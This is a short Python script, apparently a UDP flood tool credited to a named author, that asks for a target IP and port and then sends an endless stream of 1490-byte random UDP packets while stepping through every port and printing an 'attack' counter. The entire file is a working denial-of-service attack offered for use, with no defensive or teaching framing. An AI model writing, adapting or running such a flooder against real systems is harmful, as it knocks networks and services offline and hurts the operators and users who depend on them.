import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')

print("Maker  : Han Yui")
print("Github : https://github.com/Han-seungjae")

ip = input("Target IP : ")
port = int(input("Port       : "))
sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("Send as many packets as %s , IP: %s Attack Port:%s"%(sent,ip,port))
    if port == 65534:
        port = 1
